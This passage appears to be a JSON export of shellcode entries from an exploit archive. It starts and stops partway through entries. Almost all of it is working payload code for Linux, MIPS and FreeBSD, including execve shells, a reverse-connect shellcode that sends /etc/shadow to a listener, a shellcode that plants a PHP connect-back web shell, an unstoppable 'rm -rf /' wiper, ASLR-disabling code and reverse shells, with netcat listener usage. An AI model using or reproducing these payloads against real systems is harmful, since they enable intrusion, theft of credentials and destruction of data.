"\t\"\\x21\\x20\\xef\\x03\"\t/*     addu    a0,ra,t7                 */", "\t\"\\xf0\\xff\\xa4\\xaf\"\t/*     sw      a0,-16(sp)               */", "\t\"\\xf4\\xff\\xa0\\xaf\"\t/*     sw      zero,-12(sp)             */", "\t\"\\xf0\\xff\\xa5\\x23\"\t/*     addi    a1,sp,-16                */", "\t\"\\xab\\x0f\\x02\\x24\"\t/*     li      v0,4011 ( __NR_execve )  */", "\t\"\\x0c\\x01\\x01\\x01\"\t/*     syscall                          */", "\t\"/bin/sh\";", "", "int main()", "{", "    void (*p)(void);", "    p = port_bind_shellcode;", "    printf(\"shellcode size %d\\n\", sizeof(port_bind_shellcode));", "    p();", "", "    return 0;", "}", "", "// milw0rm.com [2008-08-18]"]},
{"Title": "Linux/MIPS (Linksys WRT54G/GL) - execve(\"/bin/sh\",[\"/bin/sh\"],[]) Shellcode (60 bytes)", "Author": "vaicebine", "Published": ": 2008-08-18", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-80.php", "View": null, "code": ["/*\t- MIPS little-endian ", " *\t- linux execve 60 bytes shellcode ", " *\t- execve(\"/bin/sh\",[\"/bin/sh\"],[]);", " *      - tested on Linksys WRT54G/GL (DD-WRT Linux)", " *      - based on scut paper Writing MIPS/Irix shellcode", " *", " *                              vaicebine at gmail dot com", " */", "#include <stdio.h>", "", "", "char shellcode[] = {", "\t\"\\x50\\x73\\x06\\x24\" /*     li      a2,0x7350             */", "\t\"\\xff\\xff\\xd0\\x04\" /* LB: bltzal  a2,LB                 */", "\t\"\\x50\\x73\\x0f\\x24\" /*     li      $t7,0x7350 (nop)      */", "\t\"\\xff\\xff\\x06\\x28\" /*     slti    a2, $0,-1             */", "\t\"\\xe0\\xff\\xbd\\x27\" /*     addiu   sp,sp,-32             */", "\t\"\\xd7\\xff\\x0f\\x24\" /*     li      t7,-41                */", "\t\"\\x27\\x78\\xe0\\x01\" /*     nor     t7,t7,zero            */    ", "\t\"\\x21\\x20\\xef\\x03\" /*     addu    a0,ra,t7              */", "\t\"\\xe8\\xff\\xa4\\xaf\" /*     sw      a0,-24(sp)            */", "\t\"\\xec\\xff\\xa0\\xaf\" /*     sw      zero,-20(sp)          */", "\t\"\\xe8\\xff\\xa5\\x23\" /*     addi    a1,sp,-24             */        ", "\t\"\\xab\\x0f\\x02\\x24\" /*     li      v0,4011               */", "\t\"\\x0c\\x01\\x01\\x01\" /*     syscall                       */", "\t\"/bin/sh\" ", "};", "", "int main(int argc, char *argv[]) ", "{", "\tvoid (*p)(void);", "\tp = shellcode;", "\tprintf(\"shellcode size %d\\n\", sizeof(shellcode));", "\tp();", "", "\treturn 0;", "}", "", "// milw0rm.com [2008-08-18]"]},
{"Title": "Linux/x86 - Reverse (8192/TCP) cat /etc/shadow Shellcode (155 bytes)", "Author": "0in", "Published": ": 2008-08-18", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-207.php", "View": null, "code": [";                           (C)oDed by 0in", ";                   Dark-Coders Group Productions", ";        [Linux x86 connect back&send&exit /etc/shadow 155 byte shellcode]", ";   >>>>>>>>>>>>>>>>>>>> www.dark-coders.pl <<<<<<<<<<<<<<<<<<<<<<", ";               Contact: 0in[dot]email[at]gmail[dot]com", ";           Greetings to:die_Angel,suN8Hclf,m4r1usz,cOndemned", "; Compile:", ";       nasm -f elf shellcode.asm", ";       ld -o shellcode shellcode.o", "; How it works!?", "; (1st console) [root@13world]# ./shellcode", "; (2nd console) 0in[~]%> nc -v -l -p 8192", "; (2nd console)", ";Connection from 127.0.0.1:48820", ";root:[password here]:13896::::::", ";bin:x:0::::::", ";daemon:x:0::::::", ";mail:x:0::::::", ";ftp:x:0::::::", ";nobody:x:0::::::", ";dbus:!:13716:0:99999:7:::", ";zer0in:[password here]:13716:0:99999:7:::", ";avahi:!:13716:0:99999:7:::", ";hal:!:13716:0:99999:7:::", ";clamav:!:13735:0:99999:7:::", ";fetchmail:!:13737:0:99999:7:::", ";mysql:!:12072:0:99999:7:::", ";postfix:!:13798:0:99999:7:::", ";mpd:!:13828:0:99999:7:::", ";nginx:!:13959:0:99999:7:::", ";tomcat:!:14063:0:99999:7:::", ";http:!:14075:0:99999:7:::", ";snort:!:14075:0:99999:7:::", "", ";The code (Assembler version):", "", "Section .text", "    global _start", "", "_start:", "          ;open(file,O_RDONLY):", "        xor ebx,ebx", "        push byte 0x77 ;/etc/shadow", "        push word 0x6f64", "        push 0x6168732f", "        push 0x6374652f; ----------", "        mov ebx,esp ; first arg - filename", "        xor ax,ax", "        inc ax", "        inc ax", "        inc ax", "        inc ax", "        inc ax ; ax = 5 (O_RDONLY)", "        int 0x80", "        mov ebx,eax", "        ;read(file,buff,1222):", "        xor ax,ax", "        inc ax", "        inc ax", "        inc ax ; syscall id = 3", "        mov dx,1222 ; size to read", "        push esp", "        mov ecx,[esp] ; memory", "        int 0x80", "        mov esi,eax ; file to ESI", "        ;socket(PF_INET,SOCK_STREAM,IPPROTO_IP)", "        xor ebx,ebx", "        push ebx ;0 ; 3rd arg", "        inc ebx", "        push ebx ;1 ; 2nd arg", "        inc ebx", "        push ebx ;2 ; 1st arg", "                    ;socketcall()", "        mov ax,1666 ;--------------", "        sub ax,1564 ;--------------", "        xor bx,bx   ; socket() call id", "        inc bx      ;- - - - - - - - -", "        mov ecx,esp ; socket()", "        int 0x80    ; do it!", "        pop ebx; clear mem", "        ;connect(eax,struct server,16)", "                  ;16 - sizeof struct sockaddr", "        mov edx, eax", "        xor ebx,ebx", "        xor ebx,ebx  ; ebx = 0 - IP=0.0.0.0 (set EBX to ur IP)", "        push ebx", "        mov bx,1666 ; definition of struct sockaddr", "        sub bx,1634 ;we cant stay 0x00 here (8192 PORT)", "        push bx", "        mov al, 2 ;", "        push ax", "        mov ecx, esp", "        mov al, 16", "        push eax", "        push ecx", "        push edx", "        mov al, 102", "        mov bx,1666", "        sub bx,1663 ;---------------------------------", "        mov ecx, esp", "        int 0x80 ; call connect", "        mov ebx,eax ; socket to ebx", "        ; Ok! so...", "        ; Lets write file to server and go down!", "        ;write(socket,file,1222)", "        pop ebx", "        mov ax,1666", "        sub ax,1662", "        push esi", "        mov dx,16666", "        sub dx,15444", "        int 0x80", "        ;exit(1) :", "        xor eax,eax ;----------", "        inc eax", "        mov ebx,eax ;----------", "        int 0x80    ; do it!", ";C:", ";   #include <stdio.h>", ";   char shellcode[]=\"\\x31\\xdb\"", ";   \"\\x6a\\x77\"", ";   \"\\x66\\x68\\x64\\x6f\"", ";   \"\\x68\\x2f\\x73\\x68\\x61\"", ";   \"\\x68\\x2f\\x65\\x74\\x63\"", ";   \"\\x89\\xe3\"", ";   \"\\x66\\x31\\xc0\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\x40\"", ";   \"\\xcd\\x80\"", ";   \"\\x89\\xc3\"", ";   \"\\x66\\x31\\xc0\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\x40\"", ";   \"\\x66\\xba\\xc6\\x04\"", ";   \"\\x54\"", ";   \"\\x8b\\x0c\\x24\"", ";   \"\\xcd\\x80\"", ";   \"\\x89\\xc6\"", ";   \"\\x31\\xdb\"", ";   \"\\x53\"", ";   \"\\x43\"", ";   \"\\x53\"", ";   \"\\x43\"", ";   \"\\x53\"", ";   \"\\x66\\xb8\\x82\\x06\"", ";   \"\\x66\\x2d\\x1c\\x06\"", ";   \"\\x66\\x31\\xdb\"", ";   \"\\x66\\x43\"", ";   \"\\x89\\xe1\"", ";   \"\\xcd\\x80\"", ";   \"\\x5b\"", ";   \"\\x89\\xc2\"", ";   \"\\x31\\xdb\"", ";   \"\\x53\"", ";   \"\\x66\\xbb\\x82\\x06\"", ";   \"\\x66\\x81\\xeb\\x62\\x06\"", ";   \"\\x66\\x53\"", ";   \"\\xb0\\x02\"", ";   \"\\x66\\x50\"", ";   \"\\x89\\xe1\"", ";   \"\\xb0\\x10\"", ";   \"\\x50\"", ";   \"\\x51\"", ";   \"\\x52\"", ";   \"\\xb0\\x66\"", ";   \"\\x66\\xbb\\x82\\x06\"", ";   \"\\x66\\x81\\xeb\\x7f\\x06\"", ";   \"\\x89\\xe1\"", ";   \"\\xcd\\x80\"", ";   \"\\x89\\xc3\"", ";   \"\\x5b\"", ";   \"\\x66\\xb8\\x82\\x06\"", ";   \"\\x66\\x2d\\x7e\\x06\"", ";   \"\\x56\"", ";   \"\\x66\\xba\\x1a\\x41\"", ";   \"\\x66\\x81\\xea\\x54\\x3c\"", ";   \"\\xcd\\x80\"", ";   \"\\x31\\xc0\"", ";   \"\\x40\"", ";   \"\\x89\\xc3\"", ";   \"\\xcd\\x80\";", ";   int main(int argc, char **argv)", ";    {", ";\t    int *ret;", ";\t    ret = (int *)&ret + 2;", ";\t    (*ret) = (int) shellcode;", ";    }", "", "; milw0rm.com [2008-08-18]"]},
{"Title": "Linux/x86 - Reverse PHP (Writes to /var/www/cb.php On The Filesystem) Shell Shellcode (508 bytes)", "Author": "GS2008", "Published": ": 2008-08-18", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-208.php", "View": null, "code": ["#include <stdlib.h>", "", "        /* Grayscale Research: Linux Write FS PHP Connect Back Utility Shellcode", "         *", "         *      Function:", "         *              Opens /var/www/cb.php and writes a php connectback shell to the filesystem.", "         *", "         *      Shellcode Size: 508 bytes (No Encodings)", "         *", "         *      PHP Shell Usage:", "         *              // victim", "         *              http://vulnhost.com/cb.php?host=192.168.1.1?port=777", "         *", "         *              // attacker", "         *              nc -l -p 777", "         *", "         *      greets: #c-, #hhp, #oldskewl, d-town, sd2600, dc214, everyone else.", "\t *      ", "\t *      ", "         *      ~roonr", "         */", "", "", "\t// shellcode", " \t    char sc[] = \"\\x68\\x70\\x68\\x70\\xff\\x68\\x2f\\x63\\x62\\x2e\\x68\\x2f\\x77\\x77\\x77\\x68\"", "\t\t\t \"\\x2f\\x76\\x61\\x72\\x31\\xc0\\x89\\xe6\\x88\\x46\\x0f\\x89\\xe3\\x31\\xc9\\xb1\"", "\t\t\t \"\\x42\\x31\\xd2\\xb2\\xff\\x31\\xc0\\xb0\\x05\\xcd\\x80\\x31\\xdb\\x88\\xc3\\x68\"", "\t\t\t \"\\x3f\\x3e\\xff\\xff\\x68\\x3b\\x7d\\x20\\x7d\\x68\\x24\\x72\\x29\\x29\\x68\\x6c\"", "\t\t\t \"\\x65\\x6e\\x28\\x68\\x20\\x73\\x74\\x72\\x68\\x20\\x24\\x72\\x2c\\x68\\x6f\\x63\"", "\t\t\t \"\\x6b\\x2c\\x68\\x65\\x28\\x24\\x73\\x68\\x77\\x72\\x69\\x74\\x68\\x6b\\x65\\x74\"", "\t\t\t \"\\x5f\\x68\\x3b\\x73\\x6f\\x63\\x68\\x31\\x24\\x20\\x22\\x68\\x73\\x75\\x31\\x2e\"", "\t\t\t \"\\x68\\x5c\\x6e\\x63\\x62\\x68\\x2e\\x3d\\x20\\x22\\x68\\x60\\x3b\\x24\\x72\\x68\"", "\t\t\t \"\\x20\\x60\\x24\\x69\\x68\\x24\\x72\\x20\\x3d\\x68\\x30\\x29\\x29\\x7b\\x68\\x2c\"", "\t\t\t \"\\x20\\x31\\x30\\x68\\x73\\x6f\\x63\\x6b\\x68\\x61\\x64\\x28\\x24\\x68\\x74\\x5f\"", "\t\t\t \"\\x72\\x65\\x68\\x6f\\x63\\x6b\\x65\\x68\\x24\\x69\\x3d\\x73\\x68\\x69\\x6c\\x65\"", "\t\t\t \"\\x28\\x68\\x29\\x3b\\x77\\x68\\x68\\x22\\x2c\\x31\\x30\\x68\\x74\\x65\\x64\\x3a\"", "\t\t\t \"\\x68\\x6e\\x6e\\x65\\x63\\x68\\x20\\x22\\x43\\x6f\\x68\\x6f\\x63\\x6b\\x2c\\x68\"", "\t\t\t \"\\x65\\x28\\x24\\x73\\x68\\x77\\x72\\x69\\x74\\x68\\x6b\\x65\\x74\\x5f\\x68\\x3b\"", "\t\t\t \"\\x73\\x6f\\x63\\x68\\x6f\\x72\\x74\\x29\\x68\\x2c\\x20\\x24\\x70\\x68\\x72\\x65\"", "\t\t\t \"\\x73\\x73\\x68\\x24\\x61\\x64\\x64\\x68\\x63\\x6b\\x2c\\x20\\x68\\x28\\x24\\x73\"", "\t\t\t \"\\x6f\\x68\\x6e\\x65\\x63\\x74\\x68\\x5f\\x63\\x6f\\x6e\\x68\\x63\\x6b\\x65\\x74\"", "\t\t\t \"\\x68\\x29\\x3b\\x73\\x6f\\x68\\x5f\\x54\\x43\\x50\\x68\\x2c\\x53\\x4f\\x4c\\x68\"", "\t\t\t \"\\x52\\x45\\x41\\x4d\\x68\\x4b\\x5f\\x53\\x54\\x68\\x2c\\x53\\x4f\\x43\\x68\\x49\"", "\t\t\t \"\\x4e\\x45\\x54\\x68\\x28\\x41\\x46\\x5f\\x68\\x65\\x61\\x74\\x65\\x68\\x74\\x5f\"", "\t\t\t \"\\x63\\x72\\x68\\x6f\\x63\\x6b\\x65\\x68\\x63\\x6b\\x3d\\x73\\x68\\x3b\\x24\\x73\"", "\t\t\t \"\\x6f\\x68\\x72\\x74\\x27\\x5d\\x68\\x5b\\x27\\x70\\x6f\\x68\\x5f\\x47\\x45\\x54\"", "\t\t\t \"\\x68\\x72\\x74\\x3d\\x24\\x68\\x3b\\x24\\x70\\x6f\\x68\\x74\\x27\\x5d\\x29\\x68\"", "\t\t\t \"\\x27\\x68\\x6f\\x73\\x68\\x47\\x45\\x54\\x5b\\x68\\x65\\x28\\x24\\x5f\\x68\\x79\"", "\t\t\t \"\\x6e\\x61\\x6d\\x68\\x6f\\x73\\x74\\x62\\x68\\x67\\x65\\x74\\x68\\x68\\x65\\x73\"", "\t\t\t \"\\x73\\x3d\\x68\\x61\\x64\\x64\\x72\\x68\\x73\\x65\\x7b\\x24\\x68\\x3b\\x7d\\x65\"", "\t\t\t \"\\x6c\\x68\\x34\\x2e\\x22\\x29\\x68\\x72\\x20\\x34\\x30\\x68\\x45\\x72\\x72\\x6f\"", "\t\t\t \"\\x68\\x6e\\x74\\x28\\x22\\x68\\x7b\\x70\\x72\\x69\\x68\\x74\\x27\\x5d\\x29\\x68\"", "\t\t\t \"\\x27\\x70\\x6f\\x72\\x68\\x47\\x45\\x54\\x5b\\x68\\x26\\x21\\x24\\x5f\\x68\\x74\"", "\t\t\t \"\\x27\\x5d\\x26\\x68\\x27\\x68\\x6f\\x73\\x68\\x47\\x45\\x54\\x5b\\x68\\x28\\x21\"", "\t\t\t \"\\x24\\x5f\\x68\\x50\\x20\\x69\\x66\\x68\\x3c\\x3f\\x50\\x48\\x31\\xc0\\x89\\xe6\"", "\t\t\t \"\\xb0\\x04\\x89\\xe1\\x66\\xba\\x62\\x01\\xcd\\x80\";", "", "\t", "int main(){", "\t", "", "\t// run shellcode", "        asm(\"JMP %0;\" : \"=m\" (sc));", "", "\t/*", "\t\tasm volatile(", "\t\t    \"cb_shellcode:\\n\"", "\t\t    \"push $0xff706870;\" ", "\t\t    \"push $0x2e62632f;\" ", "\t\t    \"push $0x7777772f;\" ", "\t\t    \"push $0x7261762f;\"", "\t\t    \"xor %eax, %eax;\" ", "\t\t    \"mov %esp, %esi;\"", "\t\t    \"movb %al, 0xf(%esi);\"", "\t\t   ", "\t\t    // sys_open ", "\t\t    \"mov %esp, %ebx; \"", "                    \"xor %ecx, %ecx;\"", "\t\t\t    \"movb $0x42, %cl;\"", "\t\t    \t\"xor %edx, %edx;\"", "\t\t\t    \"movb $0xff, %dl;\"", "\t\t    \t\"xor %eax, %eax;\"", "\t \t\t    \"movb $0x05, %al;\" ", "\t\t    \"int $0x80;\"", "\t\t    ", "\t\t    // sys_write", "\t\t    \"xor %ebx, %ebx;\"", "\t\t    \"mov %al, %bl;\"", "\t\t    ", "\t\t\t// php connectback shellcode", "\t\t\t\"push $0xffff3e3f; push $0x7d207d3b; push $0x29297224; push $0x286e656c;\"", "\t\t\t\"push $0x72747320; push $0x2c722420; push $0x2c6b636f; push $0x73242865;\"", "\t\t\t\"push $0x74697277; push $0x5f74656b; push $0x636f733b; push $0x22202431;\"", "\t\t\t\"push $0x2e317573; push $0x62636e5c; push $0x22203d2e; push $0x72243b60;\"", "\t\t\t\"push $0x69246020; push $0x3d207224; push $0x7b292930; push $0x3031202c;\"", "\t\t\t\"push $0x6b636f73; push $0x24286461; push $0x65725f74; push $0x656b636f;\"", "\t\t\t\"push $0x733d6924; push $0x28656c69; push $0x68773b29; push $0x30312c22;\"", "\t\t\t\"push $0x3a646574; push $0x63656e6e; push $0x6f432220; push $0x2c6b636f;\"", "\t\t\t\"push $0x73242865; push $0x74697277; push $0x5f74656b; push $0x636f733b;\"", "\t\t\t\"push $0x2974726f; push $0x7024202c; push $0x73736572; push $0x64646124;\"", "\t\t\t\"push $0x202c6b63; push $0x6f732428; push $0x7463656e; push $0x6e6f635f;\"", "\t\t\t\"push $0x74656b63; push $0x6f733b29; push $0x5043545f; push $0x4c4f532c;\"", "\t\t\t\"push $0x4d414552; push $0x54535f4b; push $0x434f532c; push $0x54454e49;\"", "\t\t\t\"push $0x5f464128; push $0x65746165; push $0x72635f74; push $0x656b636f;\"", "\t\t\t\"push $0x733d6b63; push $0x6f73243b; push $0x5d277472; push $0x6f70275b;\" ", "\t\t\t\"push $0x5445475f; push $0x243d7472; push $0x6f70243b; push $0x295d2774;\" ", "\t\t\t\"push $0x736f6827; push $0x5b544547; push $0x5f242865; push $0x6d616e79;\" ", "\t\t\t\"push $0x6274736f; push $0x68746567; push $0x3d737365; push $0x72646461;\" ", "\t\t\t\"push $0x247b6573; push $0x6c657d3b; push $0x29222e34; push $0x30342072;\" ", "\t\t\t\"push $0x6f727245; push $0x2228746e; push $0x6972707b; push $0x295d2774;\" ", "\t\t\t\"push $0x726f7027; push $0x5b544547; push $0x5f242126; push $0x265d2774;\" ", "\t\t\t\"push $0x736f6827; push $0x5b544547; push $0x5f242128; push $0x66692050;\"", "\t\t\t\"push $0x48503f3c;\"", "\t\t\t", "\t\t   \"xor %eax, %eax;\"", "\t    \t   \"mov %esp, %esi;\"\t    ", "\t\t   \"movb $0x04, %al;\"", "\t\t   \"mov %esp, %ecx;\" ", "\t\t   \"mov $0x162, %dx;\" ", "\t\t   \"int $0x80;\");", "", "\t*/", "\t\t", "}", "", "// milw0rm.com [2008-08-18]"]},
{"Title": "Linux/x86 - /bin/rm -rf / + Attempts To Block The Process From Being Stopped Shellcode (132 bytes)", "Author": "onionring", "Published": ": 2008-08-18", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-221.php", "View": null, "code": ["/*", "x86 linux rm -rf / which attempts to block the process from being stopped", "132 bytes", "written by onionring", "*/", "", "main()", "{", " char shellcode[] =", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\x89\\xC3\"              // mov ebx, eax", "\"\\x89\\xC1\"              // mov ecx, eax", "\"\\x41\"                  // inc ecx", "\"\\xB0\\x30\"              // mov al, 0x30 ; sys_signal", "\"\\xCD\\x80\"              // int 0x80", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\xFE\\xC3\"              // inc bl", "\"\\x80\\xFB\\x1F\"          // cmp bl, 0x1f", "\"\\x72\\xF3\"              // jb 0xf3", "\"\\x04\\x40\"              // add al, 0x40 ; sys_getppid", "\"\\xCD\\x80\"              // int 0x80", "\"\\x89\\xC2\"              // mov edx, eax", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\xB0\\x02\"              // mov al, 0x2 ; sys_fork", "\"\\xCD\\x80\"              // int 0x80", "\"\\x39\\xC0\"              // cmp eax, eax", "\"\\x74\\x08\"              // jnz 0x8", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\x89\\xC3\"              // mov ebx, eax", "\"\\xB0\\x01\"              // mov al, 0x1 ; sys_exit", "\"\\xCD\\x80\"              // int 0x80", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\xB0\\x42\"              // mov al, 0x42 ; sys_setsid", "\"\\xCD\\x80\"              // int 0x80", "\"\\x43\"                  // inc ebx", "\"\\x39\\xDA\"              // cmp edx, ebx", "\"\\x74\\x08\"              // jz 0x8", "\"\\x89\\xD3\"              // mov ebx, edx", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\x04\\x25\"              // add al, 0x25 ; sys_kill", "\"\\xCD\\x80\"              // int 0x80", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\x50\"                  // push eax", "\"\\x68\\x6F\\x67\\x69\\x6E\"  // push \"ogin\"", "\"\\x68\\x69\\x6E\\x2F\\x6C\"  // push \"in/l\"", "\"\\x68\\x2F\\x2F\\x2F\\x62\"  // push \"///b\"", "\"\\x89\\xE3\"              // mov ebx, esp", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\x04\\x0A\"              // add al, 0xa ; sys_unlink", "\"\\xCD\\x80\"              // int 0x80", "\"\\x31\\xC0\"              // xor eax, eax", "\"\\x50\"                  // push eax", "\"\\x68\\x2F\\x2F\\x2F\\x2F\"  // push \"////\"", "\"\\x89\\xE2\"              // mov edx, esp", "\"\\x50\"                  // push eax", "\"\\x68\\x2D\\x72\\x66\\x66\"  // push \"-rff\"", "\"\\x89\\xE1\"              // mov ecx, esp", "\"\\x50\"                  // push eax", "\"\\x68\\x6E\\x2F\\x72\\x6D\"  // push \"n/rm\"", "\"\\x68\\x2F\\x2F\\x62\\x69\"  // push \"//bi\"", "\"\\x89\\xE3\"              // mov ebx, esp", "\"\\x50\"                  // push eax", "\"\\x52\"                  // push edx", "\"\\x51\"                  // push ecx", "\"\\x53\"                  // push ebx", "\"\\x89\\xE1\"              // mov ecx, esp", "\"\\x31\\xD2\"              // xor edx, edx", "\"\\x04\\x0B\"              // add al, 0xb ; sys_execve", "\"\\xCD\\x80\";             // int 0x80", "", " (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2008-08-18]"]},
{"Title": "Linux/x86 - setuid(0) + setgid(0) + aslr_off (Disable ASLR Security) Shellcode (79 bytes)", "Author": "LiquidWorm", "Published": ": 2008-08-18", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-222.php", "View": null, "code": ["/*", " * Linux/x86 (Fedora 8) setuid(0) + setgid(0) + execve(\"echo 0 > /proc/sys/kernel/randomize_va_space\") ", " *", " * by LiquidWorm", " * ", " * 2008 (c) www.zeroscience.org", " *", " * liquidworm [at] gmail.com", " *", " * 79 bytes.", " * ", " */", "", "", "char sc[] =", "", "  \"\\x6a\\x17\"\t\t\t// push\t$0x17", "  \"\\x58\"\t\t\t// pop \t%eax", "  \"\\x31\\xdb\"\t\t\t// xor\t%ebx, %ebx", "  \"\\xcd\\x80\"\t\t\t// int\t$0x80", "  \"\\x6a\\x2e\"\t\t\t// push\t$0x2e", "  \"\\x58\"\t\t\t// pop\t%eax", "  \"\\x53\"\t\t\t// push %ebx", "  \"\\xcd\\x80\"\t\t\t// int\t$0x80", "  \"\\x31\\xd2\"\t\t\t// xor\t%edx, %edx", "  \"\\x6a\\x0b\"\t\t\t// push\t$0xb", "  \"\\x58\"\t\t\t// pop\t%eax", "  \"\\x52\"\t\t\t// push\t%edx", "  \"\\x70\\x61\\x63\\x65\"            // push $0x65636170", "  \"\\x76\\x61\\x5f\\x73\"            // push $0x735f6176", "  \"\\x69\\x7a\\x65\\x5f\"            // push $0x5f657a69", "  \"\\x6e\\x64\\x6f\\x6d\"            // push $0x6d6f646e", "  \"\\x6c\\x2f\\x72\\x61\"            // push $0x61722f6c", "  \"\\x65\\x72\\x6e\\x65\"            // push $0x656e7265", "  \"\\x73\\x2f\\x2f\\x6b\"            // push $0x6b2f2f73", "  \"\\x2f\\x2f\\x73\\x79\"            // push $0x79732f2f", "  \"\\x70\\x72\\x6f\\x63\"            // push $0x636f7270", "  \"\\x20\\x3e\\x20\\x2f\"            // push $0x2f203e20", "  \"\\x68\\x6f\\x20\\x30\"            // push $0x30206f68", "  \"\\x2f\\x2f\\x65\\x63\"            // push $0x63652f2f", "  \"\\x2f\\x62\\x69\\x6e\"            // push $0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov\t%esp, %ebx", "  \"\\x52\"\t\t\t// push\t%edx", "  \"\\x53\"\t\t\t// push\t%ebx", "  \"\\x89\\xe1\"\t\t\t// mov\t%esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int\t$0x80", " ", "int main()", "{", "\tint (*fp)() = (int(*)())sc;", "    \tprintf(\"bytes: %u\\n\", strlen(sc));", "    \tfp();", "}", "", "// milw0rm.com [2008-08-18]"]},
{"Title": "FreeBSD/x86 - execve(/bin/sh) Encoded Shellcode (48 bytes)", "Author": "c0d3_z3r0", "Published": ": 2008-08-19", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-168.php", "View": null, "code": ["/*", "", "Encoded SUB shellcode execve /bin/sh of 48 bytes", "by anderson_underground@hotmail.com <c0d3_z3r0>", "", "Hack 'n Roll", "", "*/", "", "", "char shellcode[] =", "\"\\x31\\xd2\"", "\"\\xeb\\x0e\"", "\"\\x31\\xdb\"", "\"\\x5b\"", "\"\\xb1\\x19\"", "\"\\x83\\x2c\\x1a\\x01\"", "\"\\x42\"", "\"\\xe2\\xf9\"", "\"\\xeb\\x05\"", "\"\\xe8\\xed\\xff\\xff\\xff\"", "\"\\x32\\xc1\"", "\"\\x51\"", "\"\\x69\\x30\\x30\\x74\\x69\\x69\"", "\"\\x30\\x63\\x6a\"", "\"\\x6f\"", "\"\\x32\\xdc\"", "\"\\x8a\\xe4\"", "\"\\x51\"", "\"\\x55\"", "\"\\x54\"", "\"\\x51\"", "\"\\xb1\\x3c\"", "\"\\xce\"", "\"\\x81\";", "", "", "main(){", "printf(\"Length: %d\\n\",strlen(shellcode));", "asm(\"call shellcode\");", "}", "", "// milw0rm.com [2008-08-19]"]},
{"Title": "Linux/x86 - setreuid(geteuid, geteuid) + execve(/bin/sh) Shellcode (39 bytes)", "Author": "Reth", "Published": ": 2008-08-19", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13338.c", "View": "https://old.exploit-db.com/raw/13338/", "code": ["/*", "", "setreuid(geteuid, geteuid) + execve(/bin/sh) shellcode - useful for wargames and the like.", "", "global _start", "", "section .text", "_start:", "        ; geteuid", "        push byte 49", "        pop eax", "        int 0x80", "", "        ; setreuid", "        mov ebx, eax", "        mov ecx, eax", "        push byte 70", "        pop eax", "        int 0x80", "", "        ; execve", "        xor eax,eax", "        push eax", "        push 0x68732f2f", "        push 0x6e69622f", "        push esp", "        pop ebx", "        push eax", "        push ebx", "        mov ecx, esp", "        xor edx, edx", "        mov byte al,11", "        int 0x80", "*/", "", "main() {", "        char shellcode[] = \"\\x6a\\x31\\x58\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\x31\\xc0\\x50\"", "\t\t\t   \"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\\x5b\\x50\\x53\\x89\\xe1\\x31\"", "                           \"\\xd2\\xb0\\x0b\\xcd\\x80\";", "", "        (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2008-08-19]"]},
{"Title": "FreeBSD/x86 - Reverse (127.0.0.1:8000/TCP) Shell (/bin/sh) + Null-Free Shellcode (89 bytes)", "Author": "sm4x", "Published": ": 2008-08-21", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-98.php", "View": null, "code": ["; sm4x - 2008", "; reverse portbind /bin/sh", "; NULL free if address is.", "; setuid(0); socket(); connect(); exit();", "; 89 bytes", "; FreeBSD 7.0-RELEASE", "", "global _start", "_start:", "", "xor     eax, eax", "", "; --- setuid(0)", "push    eax", "push    eax", "mov     al, 0x17", "push    eax", "int     0x80", "", "; --- socket()", "push    eax", "push    byte 0x01", "push    byte 0x02", "mov     al, 0x61", "push    eax", "int     0x80", "mov     edx, eax", "", "; --- sockaddr_in", "push    0x0100007f      ; 1.0.0.127 nb: to change see below", "push    0x401f02AA      ; 8000 nb: change (watch for .10 .0 etc..)", "mov     eax, esp", "", "; --- setup connect(edx, eax, 0x10);", "push    byte 0x10", "push    eax", "push    edx", "xor     eax, eax", "mov     al, 0x62", "push    eax", "int     0x80", "", "; -- dup2(0+1+2)..", "mov     cl, 0x03", "xor     ebx, ebx", "dups:", "push    ebx", "push    edx", "mov     al, 0x5a", "push    eax", "int     0x80", "inc     ebx", "loop   dups", "", "xor     eax, eax", "push    eax     ; null", "push    0x68732f6e", "push    0x69622f2f", "mov     ebx, esp", "", "; --- execve()", "push    ebx", "push    eax", "push    esp", "push    ebx", "mov     al, 0x3b", "push    eax", "int     0x80", "", "; --- exit", "xor     eax, eax", "push    eax", "push    eax", "int     0x80", "", "/*", "", "char code[] = \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\x50\\xcd\\x80\"", "       \"\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x61\\x50\\xcd\"", "       \"\\x80\\x89\\xc2\\x68\\x7f\\x00\\x00\\x01\\x68\"", "       \"\\x00\\x02\\x1f\\x40\\x89\\xe0\\x6a\\x10\\x50\"", "       \"\\x52\\x31\\xc0\\xb0\\x62\\x50\\xcd\\x80\\xb1\"", "       \"\\x03\\x31\\xdb\\x53\\x52\\xb0\\x5a\\x50\\xcd\"", "       \"\\x80\\x43\\xe2\\xf6\\x31\\xc0\\x50\\x68\\x6e\"", "       \"\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\"", "       